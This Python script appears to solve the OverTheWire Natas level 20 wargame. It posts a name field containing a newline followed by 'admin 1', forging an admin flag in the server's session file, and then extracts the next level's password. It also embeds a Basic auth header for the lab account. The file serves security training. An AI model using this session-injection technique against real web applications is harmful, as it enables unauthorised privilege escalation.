

import requests
import re

proxies={
    'http' : '127.0.0.1:8080',
    'https' : '127.0.0.1:8080'
}
headers = {
    'Host' : 'natas20.natas.labs.overthewire.org',
    'Authorization' : 'Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg==',
}

session = requests.Session() # cookies received will be stored in the session object

h = headers.copy()
h['Connection'] = 'Close' # force write in filesystem
h['Referrer'] = 'http://natas20.natas.labs.overthewire.org/index.php'
r = session.post(
    'http://natas20.natas.labs.overthewire.org/index.php',
    data={
        'name' : 'admin\nadmin 1'
    },
    params= { 'debug' : 1},
    headers=dict(headers),
    proxies=proxies
)

r = session.get(
    'http://natas20.natas.labs.overthewire.org/index.php',
    params= { 'debug' : 1},
    headers=dict(headers),
    proxies=proxies
)

if 'You are an admin.' in r.text:
    print("Admin credentials found!")
    match = re.search(r'^Password: ([a-zA-Z0-9]+)</pre>.*', r.text, re.MULTILINE)
    if match:    
        print("")
        print("Credentials for Natas level21")
        print("UN: natas21")
        print("PW: " + match.groups()[0])
        print("")
else:
    assert(False and 'Exploit is 100% reliable')
